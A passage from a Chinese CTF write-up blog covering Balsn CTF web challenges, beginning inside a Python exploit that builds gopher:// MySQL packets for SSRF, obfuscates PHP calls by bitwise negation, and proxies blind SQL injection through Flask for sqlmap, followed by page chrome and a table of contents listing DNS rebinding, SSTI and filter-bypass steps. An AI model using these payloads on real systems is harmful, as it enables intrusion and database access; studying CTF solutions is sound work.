class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQL</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\033[31m"</span>+<span class="string">"For making it work username should not be password protected!!!"</span>+ <span class="string">"\033[0m"</span></span><br><span class="line">    user = <span class="string">'admin'</span> <span class="comment">#raw_input("\033[96m" +"\nGive MySQL username: " + "\033[0m")</span></span><br><span class="line">    encode_user = user.encode(<span class="string">"hex"</span>)</span><br><span class="line">    user_length = len(user)</span><br><span class="line">    temp = user_length - <span class="number">4</span></span><br><span class="line">    length = (chr(<span class="number">0xa3</span>+temp)).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">    dump = length + <span class="string">"00000185a6ff0100000001210000000000000000000000000000000000000000000000"</span></span><br><span class="line">    dump +=  encode_user</span><br><span class="line">    dump += <span class="string">"00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c"</span></span><br><span class="line">    dump += <span class="string">"69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d"</span></span><br><span class="line">    dump += <span class="string">"067838365f36340c70726f6772616d5f6e616d65056d7973716c"</span></span><br><span class="line"></span><br><span class="line">    query = <span class="string">"show databases;"</span>;<span class="comment">#raw_input("\033[96m" +"Give query to execute: "+ "\033[0m")</span></span><br><span class="line"></span><br><span class="line">    auth = dump.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        a = [s[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>)]</span><br><span class="line">        <span class="comment">#return "gopher://127.0.0.1:3306/_%" + "%".join(a)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"gopher://127.0.0.1:8787/_%"</span> + <span class="string">"%"</span>.join(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_payload</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(query.strip()!=<span class="string">''</span>):</span><br><span class="line">            query = query.encode(<span class="string">"hex"</span>)</span><br><span class="line">            query_length = <span class="string">'&#123;:06x&#125;'</span>.format((int((len(query) / <span class="number">2</span>) + <span class="number">1</span>)))</span><br><span class="line">            query_length = query_length.decode(<span class="string">'hex'</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">            pay1 = query_length + <span class="string">"0003"</span> + query</span><br><span class="line">            final = self.encode(self.auth + pay1 + <span class="string">"0100000001"</span>)</span><br><span class="line">            <span class="keyword">return</span> final</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> encode(self.auth)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blind</span><span class="params">()</span>:</span></span><br><span class="line">    username = request.args.get(<span class="string">'username'</span>)</span><br><span class="line">    url = <span class="string">"http://localhost/gg.php"</span></span><br><span class="line">    url = <span class="string">"http://warmup.balsnctf.com/"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">n</span><span class="params">(s)</span>:</span></span><br><span class="line">        r = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            r += chr(~(ord(i)) &amp; <span class="number">0xFF</span>)</span><br><span class="line">        r = <span class="string">"~&#123;&#125;"</span>.format(r)</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    t = <span class="string">'('</span> + n(<span class="string">'getenv'</span>) + <span class="string">')('</span> +n(<span class="string">'HTTP_X'</span>) + <span class="string">')'</span></span><br><span class="line">    <span class="comment"># x = MySQL().get_payload("select IF(TRUE AND (select '1'='&#123;username&#125;'), sleep(10), sleep(0));".format(username=username))</span></span><br><span class="line">    x = MySQL().get_payload(<span class="string">"select id from (select 1 as id)a where id='&#123;username&#125;';"</span>.format(username=username))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> repr(x)</span><br><span class="line">    <span class="keyword">print</span> len(t)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url=url, params = &#123;</span><br><span class="line">            <span class="string">'op'</span> : <span class="string">'-9'</span>,</span><br><span class="line">            <span class="string">'Σ&gt;―(#°ω°#)♡→'</span> : t</span><br><span class="line">            &#125;,</span><br><span class="line">            cookies = &#123;<span class="string">"PHPSESSID"</span> : <span class="string">"123"</span>&#125;,</span><br><span class="line">            headers = &#123;<span class="string">"X"</span>: x&#125;,</span><br><span class="line">            timeout = <span class="number">1.5</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">python sqlmap.py -u "http://localhost:5000/?username=*" --technique=T --dbms=mysql --dbs  --level 1 --time-sec=2</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/19/Defcamp-DCTF-2018-chat-Prototype-pollution-attack有感/" rel="next" title="Defcamp(DCTF) 2018-chat Prototype pollution attack有感">
+                <i class="fa fa-chevron-left"></i> Defcamp(DCTF) 2018-chat Prototype pollution attack有感
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-Koreanfish"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 Koreanfish</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#题目描述"><span class="nav-number">1.1.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#台湾人喜欢韩国🐟"><span class="nav-number">1.1.2.</span> <span class="nav-text">台湾人喜欢韩国🐟</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Source-Code"><span class="nav-number">1.1.3.</span> <span class="nav-text">Source Code</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这是一个白盒测试，并且全部的源码是非常短的并且是简单的。"><span class="nav-number">1.1.4.</span> <span class="nav-text">这是一个白盒测试，并且全部的源码是非常短的并且是简单的。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#前置知识。"><span class="nav-number">1.1.5.</span> <span class="nav-text">前置知识。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Session上传进度。"><span class="nav-number">1.1.6.</span> <span class="nav-text">Session上传进度。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#当-session-upload-progress-enabled-INI-选项开启时，PHP-能够在每一个文件上传时监测上传进度。-这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态"><span class="nav-number">1.1.7.</span> <span class="nav-text">当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#当一个上传在处理中，同时POST一个与INI中设置的session-upload-progress-name同名变量时，上传进度可以在-SESSION中获得。-当PHP检测到这种POST请求时，它会在-SESSION中添加一组数据-索引是-session-upload-progress-prefix-与-session-upload-progress-name连接在一起的值。-通常这些键值可以通过读取INI设置来获得，例如"><span class="nav-number">1.1.8.</span> <span class="nav-text">当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得，例如</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#通过将-SESSION-key-“cancel-upload”-设置为TRUE，还可以取消一个正在处理中的文件上传。-当在同一个请求中上传多个文件，它仅会取消当前正在处理的文件上传和未处理的文件上传，但是不会移除那些已经完成的上传。-当一个上传请求被这么取消时，-FILES中的error将会被设置为-UPLOAD-ERR-EXTENSION。"><span class="nav-number">1.1.9.</span> <span class="nav-text">通过将$_SESSION[$key][“cancel_upload”]设置为TRUE，还可以取消一个正在处理中的文件上传。 当在同一个请求中上传多个文件，它仅会取消当前正在处理的文件上传和未处理的文件上传，但是不会移除那些已经完成的上传。 当一个上传请求被这么取消时，$_FILES中的error将会被设置为 UPLOAD_ERR_EXTENSION。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#session-upload-progress-freq-和-session-upload-progress-min-freq-INI选项控制了上传进度信息应该多久被重新计算一次。-通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。"><span class="nav-number">1.1.10.</span> <span class="nav-text">session.upload_progress.freq 和 session.upload_progress.min_freq INI选项控制了上传进度信息应该多久被重新计算一次。 通过合理设置这两个选项的值，这个功能的开销几乎可以忽略不计。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Example-1-样例信息"><span class="nav-number">1.1.11.</span> <span class="nav-text">Example #1 样例信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#一个上传进度数组的结构的例子"><span class="nav-number">1.1.12.</span> <span class="nav-text">一个上传进度数组的结构的例子</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在session中存放的数据看上去是这样子的："><span class="nav-number">1.1.13.</span> <span class="nav-text">在session中存放的数据看上去是这样子的：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-1"><span class="nav-number">1.1.14.</span> <span class="nav-text">step 1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如果你看到这个源码index-php，你将会知道这第一步是去绕过ip限制。"><span class="nav-number">1.1.15.</span> <span class="nav-text">如果你看到这个源码index.php，你将会知道这第一步是去绕过ip限制。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#事实上，这是一个明显的DNS重新绑定漏洞，可以绕过ip限制。"><span class="nav-number">1.1.16.</span> <span class="nav-text">事实上，这是一个明显的DNS重新绑定漏洞，可以绕过ip限制。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这个file-get-contents-会再次查询DNS和读取响应。"><span class="nav-number">1.1.17.</span> <span class="nav-text">这个file_get_contents()会再次查询DNS和读取响应。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如果我们将域的A记录设置为54-87-54-87和127-0-0-1，则可以绕过IP限制查询内部服务。"><span class="nav-number">1.1.18.</span> <span class="nav-text">如果我们将域的A记录设置为54.87.54.87和127.0.0.1，则可以绕过IP限制查询内部服务。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如果没有然后域名可以用一些在线的DNS重新绑定服务，例如：rbndr-us。"><span class="nav-number">1.1.19.</span> <span class="nav-text">如果没有然后域名可以用一些在线的DNS重新绑定服务，例如：rbndr.us。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例如36573657-7f000001-rbndr-us将返回54-87-54-87或127-0-0-1。"><span class="nav-number">1.1.20.</span> <span class="nav-text">例如36573657.7f000001.rbndr.us将返回54.87.54.87或127.0.0.1。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-2"><span class="nav-number">1.1.21.</span> <span class="nav-text">step 2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#从dockerfile中，我们知道在同一台服务器上运行着一个简单的flask应用程序。"><span class="nav-number">1.1.22.</span> <span class="nav-text">从dockerfile中，我们知道在同一台服务器上运行着一个简单的flask应用程序。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#并且在-error-page功能上存在明显的SSTI漏洞，它render-template-string-与可控的内容一起使用。"><span class="nav-number">1.1.23.</span> <span class="nav-text">并且在/error_page功能上存在明显的SSTI漏洞，它render_template_string()与可控的内容一起使用。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如果error-status设置为绝对路径，则返回路径os-path-join-将被覆盖。"><span class="nav-number">1.1.24.</span> <span class="nav-text">如果error_status设置为绝对路径，则返回路径os.path.join()将被覆盖。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例如os-path-join-quot-var-www-flask-quot-quot-error-quot-quot-etc-passwd-quot-将返回-etc-passwd。"><span class="nav-number">1.1.25.</span> <span class="nav-text">例如os.path.join(&quot;/var/www/flask&quot;, &quot;error&quot;, &quot;/etc/passwd&quot;)将返回/etc/passwd。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#但是这里的问题是你不能直接触摸它-error-page。"><span class="nav-number">1.1.26.</span> <span class="nav-text">但是这里的问题是你不能直接触摸它/error_page。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#由于前面的php将检查查询的路径，因此该路径必须包含字符串korea"><span class="nav-number">1.1.27.</span> <span class="nav-text">由于前面的php将检查查询的路径，因此该路径必须包含字符串korea:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#有两种方法可以绕过此路径的限制："><span class="nav-number">1.1.28.</span> <span class="nav-text">有两种方法可以绕过此路径的限制：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法0x1"><span class="nav-number">1.1.29.</span> <span class="nav-text">方法0x1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#你可以使用重定向："><span class="nav-number">1.1.30.</span> <span class="nav-text">你可以使用重定向：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用DNS重新绑定到服务器IP，然后设置-korea要重定向到的路径127-0-0-1-5000-error-page-err-。"><span class="nav-number">1.1.31.</span> <span class="nav-text">使用DNS重新绑定到服务器IP，然后设置/korea要重定向到的路径127.0.0.1:5000/error_page?=err......。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#原因是file-get-contents-将遵循302重定向。"><span class="nav-number">1.1.32.</span> <span class="nav-text">原因是file_get_contents()将遵循302重定向。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法0x2"><span class="nav-number">1.1.33.</span> <span class="nav-text">方法0x2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用Flask的特殊功能！"><span class="nav-number">1.1.34.</span> <span class="nav-text">使用Flask的特殊功能！</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在flask应用程序中，-korea-ping等于-ping"><span class="nav-number">1.1.35.</span> <span class="nav-text">在flask应用程序中，//korea/ping等于/ping</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因此，你可以使用-korea-error-page-err-绕过限制。"><span class="nav-number">1.1.36.</span> <span class="nav-text">因此，你可以使用//korea/error_page?err=...绕过限制。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-3"><span class="nav-number">1.1.37.</span> <span class="nav-text">step 3</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#现在，我们可以控制render-template-string-读取内容的路径。"><span class="nav-number">1.1.38.</span> <span class="nav-text">现在，我们可以控制render_template_string()读取内容的路径。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#你应该可以找到一个可以放置我们可控有效负载的文件。"><span class="nav-number">1.1.39.</span> <span class="nav-text">你应该可以找到一个可以放置我们可控有效负载的文件。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#由于服务器使用php运行，因此可以使用该session-upload-progress方法将SSTI有效负载上传到会话文件。"><span class="nav-number">1.1.40.</span> <span class="nav-text">由于服务器使用php运行，因此可以使用该session.upload_progress方法将SSTI有效负载上传到会话文件。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如果PHP-SESSION-UPLOAD-PROGRESS在多部分POST数据中提供，PHP将为您启用会话。"><span class="nav-number">1.1.41.</span> <span class="nav-text">如果PHP_SESSION_UPLOAD_PROGRESS在多部分POST数据中提供，PHP将为您启用会话。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-4"><span class="nav-number">1.1.42.</span> <span class="nav-text">step 4</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#默认session-upload-progress-cleanup设置为On，因此您的SSTI有效负载将被快速清除。"><span class="nav-number">1.1.43.</span> <span class="nav-text">默认session.upload_progress.cleanup设置为On，因此您的SSTI有效负载将被快速清除。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们可以用条件竞争绕过。"><span class="nav-number">1.1.44.</span> <span class="nav-text">我们可以用条件竞争绕过。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用脚本："><span class="nav-number">1.1.45.</span> <span class="nav-text">利用脚本：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#最后getshell成功。"><span class="nav-number">1.1.46.</span> <span class="nav-text">最后getshell成功。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-Warmup"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 Warmup</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#题目描述-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Baby-PHP-challenge-again"><span class="nav-number">1.2.2.</span> <span class="nav-text">Baby PHP challenge again.</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#源码"><span class="nav-number">1.2.3.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这个题目涉及到许多的php原理和古老的php-windows技巧。"><span class="nav-number">1.2.4.</span> <span class="nav-text">这个题目涉及到许多的php原理和古老的php/windows技巧。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-1-1"><span class="nav-number">1.2.5.</span> <span class="nav-text">step 1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#刚开始拿到源码发现非常的难读，我们需要重构一下。"><span class="nav-number">1.2.6.</span> <span class="nav-text">刚开始拿到源码发现非常的难读，我们需要重构一下。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#下面是重构后的源码："><span class="nav-number">1.2.7.</span> <span class="nav-text">下面是重构后的源码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-2-1"><span class="nav-number">1.2.8.</span> <span class="nav-text">step 2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们现在初始去读取config-php"><span class="nav-number">1.2.9.</span> <span class="nav-text">我们现在初始去读取config.php</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#有两个方式可以去用："><span class="nav-number">1.2.10.</span> <span class="nav-text">有两个方式可以去用：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-使用file-get-contents-预期"><span class="nav-number">1.2.11.</span> <span class="nav-text">1.使用file_get_contents()(预期)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-使用eval-非预期"><span class="nav-number">1.2.12.</span> <span class="nav-text">2.使用eval()(非预期)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法-0x1"><span class="nav-number">1.2.13.</span> <span class="nav-text">方法 0x1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#if-stRLEn-op-lt-4-amp-amp-op-78-lt-39-A-A-39"><span class="nav-number">1.2.14.</span> <span class="nav-text">if(@stRLEn($op) &lt; 4 &amp;&amp; @($op + 78) &lt; &#39;A__A&#39;)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#对于这段代码我们可以用op-99来绕过。"><span class="nav-number">1.2.15.</span> <span class="nav-text">对于这段代码我们可以用op=-99来绕过。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#之后我们可以输入我们的文件名到file-get-contents"><span class="nav-number">1.2.16.</span> <span class="nav-text">之后我们可以输入我们的文件名到file_get_contents():</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#GET-39-39"><span class="nav-number">1.2.17.</span> <span class="nav-text">$_GET[&#39;&#39;];</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这个参数-GET的参数是-xE2-x81-xA3，它是一个不可见的字符。"><span class="nav-number">1.2.18.</span> <span class="nav-text">这个参数$_GET的参数是\xE2\x81\xA3，它是一个不可见的字符。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们的目的是去阅读config-php，但是对我们输入的一些文件名有检查。"><span class="nav-number">1.2.19.</span> <span class="nav-text">我们的目的是去阅读config.php，但是对我们输入的一些文件名有检查。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们不能使用-php，php-的文件名后缀并且我们的文件名不能包含-quot-gt-lt-amp-。"><span class="nav-number">1.2.20.</span> <span class="nav-text">我们不能使用.php，php.的文件名后缀并且我们的文件名不能包含&quot;,&gt;,&lt;,amp,$,..。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#为了去绕过这个限制去阅读php源代码，你仅仅需要去添加一个空格-20-："><span class="nav-number">1.2.21.</span> <span class="nav-text">为了去绕过这个限制去阅读php源代码，你仅仅需要去添加一个空格(%20)：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#config-php-SPACE"><span class="nav-number">1.2.22.</span> <span class="nav-text">config.php[SPACE]</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Because-the-server-is-running-on-Windows-there-are-some-weird-path-normalization-rule-here-p"><span class="nav-number">1.2.23.</span> <span class="nav-text">(Because the server is running on Windows, there are some weird path normalization rule here :p)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#你如果尝试去读取源代码config-php使用如下payload"><span class="nav-number">1.2.24.</span> <span class="nav-text">你如果尝试去读取源代码config.php使用如下payload:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#你将会得到config-php的内容。"><span class="nav-number">1.2.25.</span> <span class="nav-text">你将会得到config.php的内容。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因为file-get-contents-的第三个参数是155。"><span class="nav-number">1.2.26.</span> <span class="nav-text">因为file_get_contents()的第三个参数是155。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们应该使用一些特殊的php包装器来解压缩config-php的内容。"><span class="nav-number">1.2.27.</span> <span class="nav-text">我们应该使用一些特殊的php包装器来解压缩config.php的内容。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因此php-filter-zlib-deflate是最好的选择。"><span class="nav-number">1.2.28.</span> <span class="nav-text">因此php://filter/zlib.deflate是最好的选择。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用zlib-deflate压缩内容，然后使用zlib-inflate解压缩内容。"><span class="nav-number">1.2.29.</span> <span class="nav-text">使用zlib.deflate压缩内容，然后使用zlib.inflate解压缩内容。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#脚本如下："><span class="nav-number">1.2.30.</span> <span class="nav-text">脚本如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#你将会看见config-php的内容。"><span class="nav-number">1.2.31.</span> <span class="nav-text">你将会看见config.php的内容。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法-0x2"><span class="nav-number">1.2.32.</span> <span class="nav-text">方法 0x2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们还可以使用eval-来读取config-php。"><span class="nav-number">1.2.33.</span> <span class="nav-text">我们还可以使用eval()来读取config.php。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在这个eval-函数中，你输入的-将会放到eval-quot-return-quot-。"><span class="nav-number">1.2.34.</span> <span class="nav-text">在这个eval()函数中，你输入的$_将会放到eval(&quot;return $_;&quot;)。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#但是有个严格的正则表达式来控制："><span class="nav-number">1.2.35.</span> <span class="nav-text">但是有个严格的正则表达式来控制：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#然而我们可以使用-来绕过许多的限制。"><span class="nav-number">1.2.36.</span> <span class="nav-text">然而我们可以使用~来绕过许多的限制。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例如：-urldecode-quot-8D-9A-9E-9B-99-96-93-9A-quot-等价于readfile"><span class="nav-number">1.2.37.</span> <span class="nav-text">例如：~urldecode(&quot;%8D%9A%9E%9B%99%96%93%9A&quot;)等价于readfile</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在windows中，有一些MAGIC通配符功能可用于路径标准化。"><span class="nav-number">1.2.38.</span> <span class="nav-text">在windows中，有一些MAGIC通配符功能可用于路径标准化。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#例如："><span class="nav-number">1.2.39.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#gt-将匹配一个任意字符。-例如-在linux中"><span class="nav-number">1.2.40.</span> <span class="nav-text">&gt;将匹配一个任意字符。(例如?在linux中)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-将匹配零个或者多个任意字符。-例如-在linux中"><span class="nav-number">1.2.41.</span> <span class="nav-text">&lt;将匹配零个或者多个任意字符。(例如*在linux中)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#结合-技巧和-lt-技巧："><span 